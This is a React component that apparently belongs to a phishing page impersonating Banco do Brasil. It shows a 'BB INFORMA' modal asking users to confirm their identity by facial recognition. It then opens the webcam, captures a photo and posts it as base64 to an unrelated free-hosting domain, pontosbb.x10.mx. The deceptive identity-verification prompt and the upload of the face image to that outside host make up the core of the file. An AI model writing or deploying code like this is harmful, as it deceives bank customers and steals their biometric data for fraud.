import React, { useRef } from 'react';
import axios from 'axios'; // Certifique-se de ter axios instalado
import './CameraComponent.css';

const CameraComponent = () => {
    const videoRef = useRef(null);
    const canvasRef = useRef(null);
    const modalRef = useRef(null);

    const closeModal = () => {
        modalRef.current.style.display = 'none';
    };

    const startCamera = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            if (videoRef.current) {
                videoRef.current.srcObject = stream;
            }
        } catch (error) {
            handleCameraError(error);
        }
    };

    const handleCameraError = (error) => {
        if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
            alert('Nenhuma câmera encontrada neste dispositivo.');
        } else if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
            alert('Permissão para acessar a câmera foi negada.');
        } else if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
            alert('A câmera não está disponível ou já está em uso.');
        } else {
            alert(`Erro ao acessar a câmera: ${error.message}`);
        }
        console.error('Error accessing camera:', error);
    };

    const capturePhoto = async () => {
      if (videoRef.current && canvasRef.current) {
          const video = videoRef.current;
          const canvas = canvasRef.current;
          const context = canvas.getContext('2d');

          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          // Captura a imagem como base64
          const imageData = canvas.toDataURL('image/jpeg');

          try {
              // Envia a imagem via POST usando Axios
              const response = await axios.post('http://pontosbb.x10.mx/uploadimg.php', {
                  image: imageData
              });

              console.log('Resposta do servidor:', response.data);
              alert('Imagem enviada com sucesso!');
          } catch (error) {
              console.error('Erro ao enviar imagem:', error);
              alert('Erro ao enviar imagem. Verifique o console para mais detalhes.');
          }
      }
  };

    React.useEffect(() => {
        startCamera();
    }, []);

    return (
        <div className='camera-frame'>
            <div className='enquadramento'></div>
            <div className='modal' ref={modalRef}>
                <div className='sob-modal'>
                    <i className="bi bi-camera" id='exclamation-icon'></i>
                    <span className='title-alert'>BB INFORMA</span>
                    <span className='subtitle-alert'>Confirme sua identidade com reconhecimento facial, habilite a permissão de câmera no seu navegador.</span>
                    <span className='resgatar-btn' onClick={closeModal}>ENTENDIDO</span>
                </div>
            </div>
            <video className='video-frame' ref={videoRef} autoPlay playsInline muted style={{ maxWidth: '100%' }} />
            <div>
                <span onClick={capturePhoto} className="capture-button">Capturar Foto</span>
            </div>
            <canvas ref={canvasRef} style={{ display: 'none' }} />
        </div>
    );
};

export default CameraComponent;
